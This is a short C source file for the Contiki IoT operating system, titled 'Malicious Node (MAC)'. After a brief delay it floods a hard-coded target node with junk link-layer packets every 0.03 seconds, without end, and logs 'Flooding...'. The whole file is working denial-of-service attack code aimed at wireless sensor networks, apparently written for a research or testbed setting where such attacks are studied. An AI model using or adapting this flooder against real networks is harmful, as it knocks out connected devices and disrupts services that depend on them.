
/**
 * @file malnodemac.c
 * @author Ghozlan
 * @brief 
 * @version 0.1
 * @date 2021-05-27
 * 
 * @copyright Copyright (c) 2021
 * 
 */
#include "contiki.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include <stdio.h>
#include <string.h>
#include "sys/log.h"

/**
 * @brief Logging macros
 * 
 */
#define LOG_MODULE "malNodeMAC"
#define LOG_LEVEL LOG_LEVEL_INFO

/**
 * @brief Server configuration macros
 * 
 */
#define SEND_INTERVAL (0.03 * CLOCK_SECOND)

/**
 * @brief Address of main node
 * 
 */
//static linkaddr_t dstAddr = {{0x00, 0xDE, 0xAD, 0xBE, 0xEF, 0xFA, 0xCA, 0xDE}};
static linkaddr_t dstAddr = {{0x00, 0x12, 0x74, 0x01, 0x00, 0x01, 0x01, 0x01}};

PROCESS(mal_node_mac_proc, "Malicious Node (MAC)");
AUTOSTART_PROCESSES(&mal_node_mac_proc);

/**
 * @brief Construct a new process thread object
 * 
 */
PROCESS_THREAD(mal_node_mac_proc, ev, data)
{
    static struct etimer timer;
    static char data_[] = {0x7e, 0xf7, 0x00, 0xe1 , 0x06, 0x63, 0x04, 0x00, 0x00,
    0x01, 0x00, 0xf0, 0x1a, 0x0a, 0x15, 0xB3, 0x31, 0x45, 0x55, 0xDE, 0xAD, 0xBE,
    0xEF, 0xFA, 0xCA, 0xDE, 0xF0, 0x0D, 0xFA, 0xCE, 0xBA, 0xD0, 0x0D, 0xAD};
    int16_t len = sizeof(data_);

    PROCESS_BEGIN();

    etimer_set(&timer, 3 * 3 * CLOCK_SECOND);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    if (!linkaddr_cmp(&dstAddr, &linkaddr_node_addr))
    {
        etimer_set(&timer, SEND_INTERVAL);
        while (1)
        {
            PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
            packetbuf_clear();
            packetbuf_copyfrom(data_, len);
            packetbuf_set_addr(PACKETBUF_ADDR_RECEIVER, &dstAddr);
            packetbuf_set_addr(PACKETBUF_ADDR_SENDER, &linkaddr_node_addr);
            LOG_INFO("[*] Flooding... (UDP)\n");
            NETSTACK_MAC.send(NULL, NULL);
            etimer_reset(&timer);
        }
    }
    PROCESS_END();
}